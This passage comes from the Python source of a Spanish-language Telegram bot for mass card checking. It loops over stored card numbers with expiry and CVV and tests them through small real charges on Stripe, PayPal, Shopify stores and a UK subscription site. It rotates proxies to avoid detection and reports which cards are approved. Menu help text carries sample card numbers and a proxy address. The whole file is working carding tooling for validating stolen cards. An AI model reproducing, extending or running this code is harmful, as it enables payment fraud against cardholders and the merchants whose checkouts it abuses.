    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_stripe_noavs_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1 NO AVS\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN STRIPE $1 NO AVS COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s
✨ Zero AVS requirement - Maximum efficiency

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 No AVS - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA PAYPAL (SOLO $0.10) ====================

@bot.message_handler(commands=['mpp'])
def cmd_mass_paypal(message):
    """Verificación masiva con PayPal (SOLO GATE $0.10)"""
    
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 2  # Delay más corto porque solo es un gate
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"mpp_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""💰 VERIFICACIÓN MASIVA PAYPAL (SOLO $0.10)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
💵 Gate: PayPal $0.10
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_paypal, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_paypal(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con PayPal - SOLO GATE $0.10"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación PayPal $0.10...")
    
    procesadas = 0
    resultados = {
        'success': 0,
        'failed': 0,
        'error': 0
    }
    detalles = []
    start_time = time.time()
    proxy_index = 0
    
    proxies = obtener_proxies()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        
        mejor_resultado = None
        if proxies:
            # Rotación de proxies
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1
            resultado = verificar_api_paypal(card, gate=2, proxy=proxy)
            mejor_resultado = resultado
        else:
            resultado = verificar_api_paypal(card, gate=2)
            mejor_resultado = resultado
        
        if mejor_resultado:
            guardar_historial(card, mejor_resultado['proxy'], 'PayPal $0.10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            if mejor_resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif mejor_resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            # Guardar detalle
            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
        else:
            detalles.append(f"❌ {card} | ERROR")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_paypal_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN PAYPAL $0.10\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN PAYPAL $0.10 COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados PayPal $0.10 - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA AUTOSHOPIFY ====================

@bot.message_handler(commands=['msh'])
def cmd_mass_shopify(message):
    """Verificación masiva con AutoShopify - CON LIMPIEZA AUTOMÁTICA"""
    
    tarjetas = obtener_todas_tarjetas()
    sitios = obtener_sitios()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    if not sitios:
        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY (CON LIMPIEZA)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
🌐 Sitios: {len(sitios)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}
🧹 Sitios malos se eliminan automáticamente

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_shopify, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_shopify(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con AutoShopify - CON LIMPIEZA AUTOMÁTICA"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    sitios = obtener_sitios()
    total_tarjetas = len(cards)
    total_sitios = len(sitios)
    
    if total_tarjetas == 0 or total_sitios == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify (con limpieza automática)...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0, 'sitios_eliminados': 0}
    detalles = []
    start_time = time.time()
    sitio_index = 0
    proxy_index = 0
    
    proxies = obtener_proxies()
    
    # Lista para sitios a eliminar
    sitios_a_eliminar = []
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        # Obtener sitio actual
        sitio_index_actual = sitio_index % len(sitios) if sitios else 0
        if not sitios:
            bot.edit_message_text("❌ No quedan sitios válidos", chat_id, msg.message_id)
            break
            
        sitio = sitios[sitio_index_actual]
        sitio_index += 1
        
        bin_info = consultar_bin(card[:6])
        
        mejor_resultado = None
        if proxies:
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1
            resultado = verificar_api_autoshopify(card, sitio, proxy)
            mejor_resultado = resultado
        else:
            resultado = verificar_api_autoshopify(card, sitio)
            mejor_resultado = resultado
        
        if mejor_resultado:
            mensaje = mejor_resultado.get('message', '').lower()
            
            # Verificar si el sitio está muerto
            respuestas_muertas = ['py id empty', '404', 'not found', 'connection refused']
            if any(rm in mensaje for rm in respuestas_muertas):
                if sitio not in sitios_a_eliminar:
                    sitios_a_eliminar.append(sitio)
                    resultados['sitios_eliminados'] += 1
                    print(f"🗑️ Sitio marcado para eliminar: {sitio}")
            
            # Guardar en historial solo si el sitio es válido
            if sitio not in sitios_a_eliminar:
                guardar_historial(card, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                                mejor_resultado['amount'], mejor_resultado['status'], 
                                mejor_resultado['message'], mejor_resultado['gates'], bin_info)
                
                actualizar_estadisticas_sitio(sitio, mejor_resultado['success'])
                
                if mejor_resultado['status'] == 'success':
                    resultados['success'] += 1
                    estado_emoji = "✅"
                elif mejor_resultado['status'] == 'failed':
                    resultados['failed'] += 1
                    estado_emoji = "❌"
                else:
                    resultados['error'] += 1
                    estado_emoji = "⚠️"
                
                detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | {mejor_resultado['status']} | {mejor_resultado['message'][:30]}")
        
        procesadas = i
        
        # Actualizar progreso
        if i % notificar_cada == 0 or i == total_tarjetas:
            porcentaje = (i / total_tarjetas) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total_tarjetas:
            time.sleep(delay)
    
    # Eliminar sitios muertos de la base de datos
    if sitios_a_eliminar:
        conn = get_db_connection()
        cursor = conn.cursor()
        for sitio in sitios_a_eliminar:
            cursor.execute("DELETE FROM sitios WHERE url = ?", (sitio,))
        conn.commit()
        conn.close()
        bot.send_message(chat_id, f"🗑️ Se eliminaron {len(sitios_a_eliminar)} sitios que no funcionan")
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_shopify_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total_tarjetas}\n")
        f.write(f"Sitios usados: {len(sitios)}\n")
        f.write(f"Sitios eliminados: {resultados['sitios_eliminados']}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== NUEVO COMANDO MASIVO iSubscribe UK ====================

@bot.message_handler(commands=['muk'])
def cmd_mass_isubscribe(message):
    """
    Verificación masiva con iSubscribe UK (£4.00)
    """
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"muk_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""🇬🇧 VERIFICACIÓN MASIVA iSubscribe UK (£4.00)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_isubscribe, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_isubscribe(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con iSubscribe UK"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🇬🇧 Iniciando verificación masiva iSubscribe UK...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        
        resultado = verificar_isubscribe(card, None)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'], 
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            # Guardar detalle
            detalles.append(f"{estado_emoji} {card} | {resultado['status']} | {resultado['message'][:50]} | {resultado['proxy']}")
        else:
            detalles.append(f"❌ {card} | ERROR")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_isubscribe_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN iSubscribe UK £4.00\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN iSubscribe UK COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"🇬🇧 Resultados iSubscribe UK - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== CALLBACKS PARA BOTONES ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'volver_principal':
        bot.edit_message_text(
            "Selecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_principal()
        )
    
    elif call.data == 'menu_tarjetas':
        bot.edit_message_text(
            "💳 *GESTIÓN DE TARJETAS*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_tarjetas()
        )
    
    elif call.data == 'menu_proxies':
        bot.edit_message_text(
            "🌐 *GESTIÓN DE PROXIES*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'menu_paypal':
        bot.edit_message_text(
            "💰 *SELECCIONA GATE PAYPAL*\n\nElige el monto:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_paypal()
        )
    
    elif call.data == 'menu_stripe_noavs':
        bot.send_message(
            call.message.chat.id,
            "💳 *STRIPE $1 NO AVS (GATE 5)*\n\n"
            "✨ **Zero AVS Requirement**\n"
            "Máxima eficiencia sin necesidad de dirección\n\n"
            "Usa: `/check5 NUMERO|MES|AÑO|CVV`\n\n"
            "Ejemplo: `/check5 5282274314918862|10|2029|335`\n\n"
            "Masivo: `/mass`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'menu_shopify':
        bot.edit_message_text(
            "🛍️ *GESTIÓN DE SITIOS SHOPIFY*\n\nSelecciona una opción:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'menu_isubscribe':  # NUEVO CALLBACK
        bot.send_message(
            call.message.chat.id,
            "🇬🇧 *iSubscribe UK £4.00*\n\n"
            "Cargo real en tienda del Reino Unido\n\n"
            "Usa: `/uk NUMERO|MES|AÑO|CVV`\n\n"
            "Ejemplo: `/uk 4111111111111111|12|2025|123`\n\n"
            "Masivo: `/muk`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'paypal_10':
        bot.send_message(
            call.message.chat.id,
            "💰 *PAYPAL $10.00*\n\nUsa: `/pp NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'paypal_01':
        bot.send_message(
            call.message.chat.id,
            "🪙 *PAYPAL $0.10*\n\nUsa: `/pp2 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp2 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'paypal_1':
        bot.send_message(
            call.message.chat.id,
            "💎 *PAYPAL $1.00*\n\nUsa: `/pp3 NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/pp3 377481019318036|06|2029|1937`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'shopify_individual':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *AUTOSHOPIFY INDIVIDUAL*\n\nUsa: `/sh NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/sh 4128717483067607|07|27|443`\n\nPara sitio específico: `/sh CC URL`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'shopify_masivo':
        bot.send_message(
            call.message.chat.id,
            "🛍️ *VERIFICACIÓN MASIVA SHOPIFY*\n\nUsa: `/msh`\n\nOpciones:\n`/msh --delay 3 --notificar 10`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'add_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR SITIO SHOPIFY*\n\nEnvía la URL del sitio:\n`https://tienda.myshopify.com`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_sitio)
    
    elif call.data == 'listar_sitios':
        cmd_listar_sitios(call.message)
    
    elif call.data == 'del_sitio':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR SITIO*\n\nEnvía la URL del sitio a eliminar:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_sitio)
    
    elif call.data == 'del_all_sitios':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'menu_stats':
        stats = obtener_estadisticas()
        texto = (
            "╔════════════════════════════╗\n"
            "║     📊 ESTADÍSTICAS        ║\n"
            "╠════════════════════════════╣\n"
            f"║ 🌐 PROXIES                 ║\n"
            f"║    📌 {stats['proxies']} guardados        ║\n"
            f"║    ✅ {stats['exits_proxy']} éxitos       ║\n"
            f"║    ❌ {stats['fallos_proxy']} fallos       ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 🛍️ SITIOS                 ║\n"
            f"║    📌 {stats['sitios']} guardados         ║\n"
            f"║    ✅ {stats['exits_sitio']} éxitos        ║\n"
            f"║    ❌ {stats['fallos_sitio']} fallos        ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 💳 TARJETAS                ║\n"
            f"║    📋 {stats['tarjetas']} total          ║\n"
            f"╠════════════════════════════╣\n"
            f"║ 📝 VERIFICACIONES          ║\n"
            f"║    📈 {stats['checks']} totales       ║\n"
            f"║    ✅ {stats['aprobadas']} aprobadas     ║\n"
            "╚════════════════════════════╝"
        )
        bot.send_message(call.message.chat.id, texto, reply_markup=menu_principal())
    
    elif call.data == 'menu_cargar':
        bot.send_message(
            call.message.chat.id,
            "📁 *CARGAR ARCHIVO*\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com\n\nEl bot detectará automáticamente qué es cada cosa.",
            parse_mode='Markdown'
        )
    
    elif call.data == 'listar_tarjetas':
        listar_tarjetas(call.message)
    
    elif call.data == 'listar_proxies':
        listar_proxies(call.message)
    
    elif call.data == 'add_proxy':
        msg = bot.send_message(
            call.message.chat.id,
            "➕ *AÑADIR PROXY*\n\nEnvía el proxy en formato:\n`ip:puerto:user:pass`\n\nEjemplo: `193.36.187.170:3128:user:pass`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_add_proxy)
    
    elif call.data == 'del_proxy':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR PROXY*\n\nEnvía el proxy a eliminar:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_proxy)
    
    elif call.data == 'del_all_proxies':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'confirm_del_all_proxies':
        cantidad = eliminar_todos_proxies()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} proxies*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'cancel_del_all_proxies':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'confirm_del_all_sitios':
        cantidad = eliminar_todos_sitios()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} sitios*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'cancel_del_all_sitios':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=menu_shopify()
        )
    
    elif call.data == 'test_proxies_fast':
        cmd_test_proxies_ultra_rapido(call.message)
    
    elif call.data == 'clean_dead':
        eliminados = eliminar_proxies_muertos()
        bot.send_message(
            call.message.chat.id,
            f"🧹 Se eliminaron {eliminados} proxies muertos",
            reply_markup=menu_proxies()
        )
    
    elif call.data == 'clean_sites':
        msg = bot.send_message(
            call.message.chat.id,
            "🧹 Limpiando sitios muertos..."
        )
        try:
            eliminados = limpiar_sitios_muertos()
            sitios_restantes = len(obtener_sitios())
            
            texto = f"""🧹 LIMPIEZA DE SITIOS COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
🗑️ Sitios eliminados: {eliminados}
📌 Sitios restantes: {sitios_restantes}"""
            
            bot.edit_message_text(texto, call.message.chat.id, msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {str(e)}", call.message.chat.id, msg.message_id)
    
    elif call.data == 'eliminar_tarjeta':
        msg = bot.send_message(
            call.message.chat.id,
            "🗑️ *ELIMINAR TARJETA*\n\nEnvía la tarjeta a eliminar en formato:\n`NUMERO|MES|AÑO|CVV`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, procesar_del_tarjeta)
    
    elif call.data == 'limpiar_tarjetas':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todas", callback_data='confirm_limpiar_tarjetas')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_limpiar_tarjetas')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text(
            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODAS las tarjetas guardadas permanentemente.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=confirmacion
        )
    
    elif call.data == 'confirm_limpiar_tarjetas':
        cantidad = eliminar_todas_tarjetas()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} tarjetas*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=menu_tarjetas()
        )
    
    elif call.data == 'cancel_limpiar_tarjetas':
